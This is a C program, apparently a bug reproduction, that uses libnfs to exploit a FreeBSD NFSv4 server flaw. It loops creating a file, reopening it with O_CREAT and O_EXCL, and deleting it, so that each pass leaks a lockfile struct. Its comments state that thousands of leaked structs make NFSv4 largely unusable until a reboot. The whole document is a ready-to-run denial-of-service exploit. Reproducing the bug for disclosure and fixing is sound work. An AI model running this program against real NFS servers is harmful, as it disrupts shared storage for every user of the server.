#include <fcntl.h>
#include <signal.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <unistd.h>

#include <nfsc/libnfs.h>

// This program repeatedly triggers a bug in FreeBSD NFSv4 that results in a
// lockfile struct being created and added to nfslockhash without any open file
// associated with it. This results in the lockfile struct being effectively
// leaked and unremovable from the nfslockhash without a reboot. A single leaked
// object does not produce any issues, but thousands will result in lookup
// operations on nfslockhash taking longer and longer, creating contention for
// the NFS state lock, until the contention is so bad that NFSv4 is largely
// unusable.
//
// The bug is triggered when open with O_CREAT and O_EXCL is performed on a file
// that already exists. The server will return NFS4ERR_EXISTS, meaning that
// there is no file handle to close and remove the lockfile entry, resulting in
// it being leaked.
//
// To repeatedly trigger this bug, it is necessary to use a new file each time,
// as only one leaked object can be created per vnode. Subsequent calls to OPEN
// on the same vnode will not create additional leaked objects. To avoid this
// issue, the file can be deleted then recreated before the call to open with
// O_CREAT and O_EXCL.
//
// This program takes two arguments, URL and FILEPATH. URL is a libnfs URL of
// the NFSv4 share to mount (for example: nfs://127.0.0.1/?version=4). FILEPATH
// is a file path on the share that the program has permission to repeatedly
// create and delete. If the file already exists, it will be deleted.

// Simple signal handling to allow for a clean exit.
volatile sig_atomic_t shutdown = 0;

void sigint_handler(int s) {
    shutdown = 1;
}

int main(int argc, char *argv[]) {
    char *url;
    char *file_path;
    struct timespec sleep_time = { .tv_nsec = 10 * 1000 * 1000 };

    struct nfs_context *nfs = NULL;
    struct nfs_url *parsed_url = NULL;

    int count = 0;
    int return_code = 0;
    int ret;

    if (argc != 3) {
        printf("Usage: %s URL FILEPATH\n", argv[0]);
        return_code = 1;
        goto cleanup;
    }

    url = argv[1];
    file_path = argv[2];

    signal(SIGINT, sigint_handler);

    nfs = nfs_init_context();
    if (!nfs) {
        fprintf(stderr, "Failed to initialize NFS context\n");
        return_code = 1;
        goto cleanup;
    }

    parsed_url = nfs_parse_url_dir(nfs, url);
    if (!parsed_url) {
        fprintf(stderr, "Failed to parse URL\n");
        return_code = 1;
        goto cleanup;
    }

    // Ensure the file is not currently present
    ret = nfs_mount(nfs, parsed_url->server, parsed_url->path);
    if (ret < 0) {
        fprintf(stderr, "Failed to mount nfs share: %s\n", nfs_get_error(nfs));
        return_code = 1;
        goto cleanup;
    }

    nfs_unlink(nfs, file_path);

    printf("Running. Press CTRL+C to exit\n");

    while (!shutdown) {
        struct nfsfh *fh;

        // Create a new file.
        ret = nfs_open(nfs, file_path, O_CREAT, &fh);
        if (ret < 0) {
            fprintf(stderr, "Failed to create file: %s\n", nfs_get_error(nfs));
            return_code = 1;
            goto cleanup;
        }

        ret = nfs_close(nfs, fh);
        if (ret < 0) {
            fprintf(stderr, "Failed to close file: %s\n", nfs_get_error(nfs));
            return_code = 1;
            goto cleanup;
        }

        // Open the file with O_CREAT and O_EXCL. This triggers the bug and results in a leaked object.
        ret = nfs_open(nfs, file_path, O_CREAT | O_EXCL, &fh);
        if (ret < 0 && ret != -17) {
            if (!ret) {
                fprintf(stderr, "Did not get expected error NFS4ERR_EXIST from open. Got success\n");
            } else {
                fprintf(stderr, "Did not get expected error NFS4ERR_EXIST from open. Got: %s\n", nfs_get_error(nfs));
            }
            return_code = 1;
            goto cleanup;
        }

        // Remove the file so the bug can be retriggered.
        ret = nfs_unlink(nfs, file_path);
        if (ret < 0) {
            fprintf(stderr, "Failed to unlink file: %s\n", nfs_get_error(nfs));
            return_code = 1;
            goto cleanup;
        }

        count++;

        // Sleep for 10ms to avoid NFS4ERR_RESOURCE.
        nanosleep(&sleep_time, NULL);
    }

    printf("\nCreated %d lost lockfile structs\n", count);

    cleanup:
    if (parsed_url) {
        nfs_destroy_url(parsed_url);
    }

    if (nfs) {
        nfs_destroy_context(nfs);
    }

    return return_code;
}